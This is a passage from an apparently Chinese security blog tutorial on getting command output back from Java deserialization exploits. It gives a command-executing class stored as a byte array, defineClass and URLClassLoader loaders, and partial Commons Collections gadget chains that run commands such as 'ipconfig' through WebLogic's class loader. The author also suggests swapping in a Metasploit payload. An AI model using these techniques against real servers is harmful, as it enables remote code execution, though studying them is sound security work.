class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">97</span>, <span class="number">112</span>, <span class="number">112</span>, <span class="number">101</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">44</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">66</span>, <span class="number">117</span>, <span class="number">102</span>, <span class="number">102</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">116</span>, <span class="number">111</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">23</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">0</span>, <span class="number">26</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">27</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">27</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">112</span>, <span class="number">42</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">1</span>, -<span class="number">69</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">89</span>, <span class="number">6</span>, -<span class="number">67</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">89</span>, <span class="number">3</span>, <span class="number">18</span>, <span class="number">4</span>, <span class="number">83</span>, <span class="number">89</span>, <span class="number">4</span>, <span class="number">18</span>, <span class="number">5</span>, <span class="number">83</span>, <span class="number">89</span>, <span class="number">5</span>, <span class="number">43</span>, <span class="number">83</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">6</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">7</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">77</span>, -<span class="number">69</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">89</span>, <span class="number">44</span>, <span class="number">18</span>, <span class="number">10</span>, -<span class="number">72</span>, <span class="number">0</span>, <span class="number">11</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">78</span>, -<span class="number">69</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">89</span>, <span class="number">45</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">58</span>, <span class="number">4</span>, -<span class="number">69</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">89</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">58</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">58</span>, <span class="number">6</span>, <span class="number">25</span>, <span class="number">4</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">89</span>, <span class="number">58</span>, <span class="number">6</span>, -<span class="number">58</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">25</span>, <span class="number">5</span>, <span class="number">25</span>, <span class="number">6</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">19</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">87</span>, -<span class="number">89</span>, -<span class="number">1</span>, -<span class="number">24</span>, -<span class="number">69</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">89</span>, <span class="number">25</span>, <span class="number">5</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">21</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">22</span>, -<span class="number">65</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">28</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">38</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">36</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">50</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">60</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">69</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">72</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">83</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">99</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">0</span>, <span class="number">29</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">72</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">30</span>, <span class="number">0</span>, <span class="number">31</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">32</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">36</span>, <span class="number">0</span>, <span class="number">76</span>, <span class="number">0</span>, <span class="number">34</span>, <span class="number">0</span>, <span class="number">35</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">50</span>, <span class="number">0</span>, <span class="number">62</span>, <span class="number">0</span>, <span class="number">36</span>, <span class="number">0</span>, <span class="number">37</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">60</span>, <span class="number">0</span>, <span class="number">52</span>, <span class="number">0</span>, <span class="number">38</span>, <span class="number">0</span>, <span class="number">39</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">69</span>, <span class="number">0</span>, <span class="number">43</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">0</span>, <span class="number">41</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">72</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">0</span>, <span class="number">42</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">43</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">31</span>, <span class="number">0</span>, <span class="number">2</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">72</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">44</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">45</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">46</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">47</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">48</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">49</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">45</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">26</span>, <span class="number">0</span>, <span class="number">50</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">51</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">52</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// 只处理Summer类</span></span><br><span class="line">        <span class="keyword">if</span> (name.equals(testClassName)) &#123;</span><br><span class="line">            <span class="comment">// 调用JVM的defineClass方法定义Summer类</span></span><br><span class="line">            <span class="keyword">return</span> defineClass(testClassName, testClassBytes, <span class="number">0</span>, testClassBytes.length);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.findClass(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 创建自定义的类加载器</span></span><br><span class="line">        demo2 loader = <span class="keyword">new</span> demo2();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 使用自定义的类加载器加载TestHelloWorld类</span></span><br><span class="line">            Class testClass = loader.loadClass(testClassName);</span><br><span class="line">            <span class="comment">// 反射创建Summer类，等价于 Summer t = new Summer(‘ipconfig);</span></span><br><span class="line">            testClass.getConstructor(String.class).newInstance("ipconfig");</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Summer类代码，这里是将回显结果使用异常类抛出。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Summer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Summer</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        InputStream stream = (<span class="keyword">new</span> ProcessBuilder(<span class="keyword">new</span> String[]&#123;<span class="string">"cmd.exe"</span>, <span class="string">"/c"</span>, cmd&#125;)).start().getInputStream();</span><br><span class="line">        InputStreamReader streamReader = <span class="keyword">new</span> InputStreamReader(stream, Charset.forName(<span class="string">"gbk"</span>));</span><br><span class="line">        BufferedReader bufferedReader = <span class="keyword">new</span> BufferedReader(streamReader);</span><br><span class="line">        StringBuffer buffer = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">        String line = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">while</span>((line = bufferedReader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            buffer.append(line).append(<span class="string">"\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> Exception(buffer.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200605102043439.gif" alt="在这里插入图片描述"></p><hr><p>&emsp;&emsp; 工具类将<code>.class</code>字节码文件转化成字节数组，可以添加自定义改造成适合自己方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FiletoBytes</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">FiletoBytes</span><span class="params">(String file_name)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Author</span>:         summer</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@CreateDate</span>:     2020/5/26 14:39</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@UpdateUser</span>:     summer</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@UpdateDate</span>:     2020/5/26 14:39</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@UpdateRemark</span>:   修改内容</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Version</span>:        v1.0.0</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Description</span>:    只需要传入文件的绝对路径就可以进行转化</span></span><br><span class="line"><span class="comment">     *  需要根据文件大小修改bytes大小</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">FiletoBytes</span><span class="params">(String filename )</span></span>&#123;</span><br><span class="line">        String buf = <span class="keyword">null</span>;</span><br><span class="line">        <span class="comment">// 20m</span></span><br><span class="line">        <span class="keyword">byte</span>[] bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">4096</span>];</span><br><span class="line">        File file = <span class="keyword">new</span> File(filename);</span><br><span class="line"></span><br><span class="line">        FileInputStream fis = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            fis = <span class="keyword">new</span> FileInputStream(file);</span><br><span class="line"></span><br><span class="line">            fis.read(bytes);</span><br><span class="line">            buf = Arrays.toString(bytes);</span><br><span class="line">            fis.close();</span><br><span class="line">            <span class="keyword">return</span> buf;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> buf;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Author</span>:         summer</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@CreateDate</span>:     2020/5/26 15:20</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@UpdateUser</span>:     summer</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@UpdateDate</span>:     2020/5/26 15:20</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@UpdateRemark</span>:   修改内容</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Version</span>:        v1.0.0</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Description</span>:    bytes大小需要传入设置</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">FiletoBytes</span><span class="params">(String filename ,<span class="keyword">byte</span>[] bytes)</span></span>&#123;</span><br><span class="line">        String buf = <span class="keyword">null</span>;</span><br><span class="line">        File file = <span class="keyword">new</span> File(filename);</span><br><span class="line"></span><br><span class="line">        FileInputStream fis = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            fis = <span class="keyword">new</span> FileInputStream(file);</span><br><span class="line"></span><br><span class="line">            fis.read(bytes);</span><br><span class="line">            buf = Arrays.toString(bytes);</span><br><span class="line">            fis.close();</span><br><span class="line">            <span class="keyword">return</span> buf;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> buf;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单使用demo，将Summer.class文件转化。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">demo1</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Summer.class的绝对路径</span></span><br><span class="line">    <span class="comment">// E:\Soures\JavaLearnVulnerability\Summer.class自行修改</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> String file_name = <span class="string">"E:"</span> + File.separator + <span class="string">"Soures"</span> + File.separator + <span class="string">"JavaLearnVulnerability"</span> + File.separator + <span class="string">"Summer.class"</span>;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">byte</span>[] bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1600</span>];</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        FiletoBytes filetoBytes = <span class="keyword">new</span> FiletoBytes(file_name);</span><br><span class="line"><span class="comment">//        System.out.println("直接传入文件，默认bytes大小默认为4kb");</span></span><br><span class="line"><span class="comment">//        System.out.println(filetoBytes.FiletoBytes(file_name));</span></span><br><span class="line">        System.out.println(<span class="string">"传入文件和bytes"</span>);</span><br><span class="line">        System.out.println(filetoBytes.FiletoBytes(file_name,bytes));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>温馨提示：在转文件的时候最好先看看文件大小，传入合适的数组大小。因为后面这些多余出0要删除，否则会报错。<br><img src="https://img-blog.csdnimg.cn/2020060510594243.png" alt="在这里插入图片描述"></p></blockquote><hr><h2 id="defineclass’s-demo"><a href="#defineclass’s-demo" class="headerlink" title="defineclass’s demo"></a>defineclass’s demo</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">defineclass</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String classname = <span class="string">"summer.classload.Summer"</span>;</span><br><span class="line">    <span class="comment">// 部分字节码，完整获取github。</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] classBytes = <span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;</span><br><span class="line">            -<span class="number">54</span>, -<span class="number">2</span>, -<span class="number">70</span>, -<span class="number">66</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">52</span>, <span class="number">0</span>, <span class="number">96</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">0</span>, <span class="number">53</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">54</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">55</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">56</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">57</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">58</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">59</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">60</span>, <span class="number">0</span>, <span class="number">61</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">62</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">63</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">64</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">66</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">67</span>,&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用反射的方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        defineclass defineclass = <span class="keyword">new</span> defineclass();</span><br><span class="line">        Class cls = defineclass.defineClass(classname,classBytes,<span class="number">0</span>,classBytes.length);</span><br><span class="line">        cls.getConstructor(String.class).newInstance("whoami");</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200605110551596.png" alt="在这里插入图片描述"></p><hr><h2 id="ccdefineclass"><a href="#ccdefineclass" class="headerlink" title="ccdefineclass"></a>ccdefineclass</h2><p>&emsp;&emsp; 改写cc链，来达到获取回显。这里有一个坑，JDK自带<code>java.lang.ClassLoader</code>类下的defineclass是权限是<code>protected</code>不能直接通过反射调用，故不顾虑使用这个类，笔者使用的是weblogic中的<code>wlfullclient.jar!.org.mozilla.classfile.DefiningClassLoader</code>。<br>笔者这里只给出部分实现代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line"><span class="comment">//                new ConstantTransformer(ClassLoader.class),</span></span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(DefiningClassLoader<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getConstructor",</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;Class[]<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line">                        new Object[]&#123;new Class[0]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"newInstance"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;Object[]<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line">                        new Object[]&#123;new Object[0]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"defineClass"</span>,</span><br><span class="line">                        new Class[]&#123;String.class,byte[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[]&#123;<span class="string">"summer.classload.Summer"</span>,bytes&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"newInstance"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[]&#123;&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"Exec"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;String<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line">                        new Object[]&#123;"ipconfig"&#125;),</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure><hr><h1 id="URLClassLoader远程加载文件回显"><a href="#URLClassLoader远程加载文件回显" class="headerlink" title="URLClassLoader远程加载文件回显"></a>URLClassLoader远程加载文件回显</h1><p>&emsp;&emsp; URLClassLoader是<code>java.net</code>下的类，继承了<code>java.lang.Classloader</code>类对象。URLClassLoader可以从远端或者本地加载jar/class文件。</p><p><img src="https://img-blog.csdnimg.cn/20200605154823661.png" alt="在这里插入图片描述"></p><hr><h2 id="URLClassLoader’s-Demo"><a href="#URLClassLoader’s-Demo" class="headerlink" title="URLClassLoader’s Demo"></a>URLClassLoader’s Demo</h2><ol><li>编写exp代码，代码已经上传至GitHub项目中。</li><li>编译<code>javac Summer.java</code></li><li>创建http服务 <code>py -2 -m SimpleHTTPServer  8090</code></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">demo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">"http://127.0.0.1:8090/summer.jar"</span>);</span><br><span class="line"><span class="comment">//        URL url = new URL("file:e:/summer.jar");</span></span><br><span class="line"></span><br><span class="line">        URLClassLoader ucl = <span class="keyword">new</span> URLClassLoader(<span class="keyword">new</span> URL[]&#123;url&#125;);</span><br><span class="line">        Class cls = ucl.loadClass(<span class="string">"Summer"</span>);</span><br><span class="line">        Method m = cls.getMethod(<span class="string">"Exec"</span>,String<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        m.invoke(cls.newInstance(),<span class="string">"ipconfig"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200605160339489.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200605170754423.gif" alt="在这里插入图片描述"></p><hr><h2 id="CCURLClassLoader"><a href="#CCURLClassLoader" class="headerlink" title="CCURLClassLoader"></a>CCURLClassLoader</h2><p>&emsp;&emsp; 同样使用cc链来改造此回显方法，<code>试想一下把这个jar换成msf的payload可以达到什么效果呢？</code>这里我不实现，自己可以去脑洞实现一下，很简单的，我相信看过我文章的人都应该会。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(URLClassLoader<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getConstructor",</span><br><span class="line">                        <span 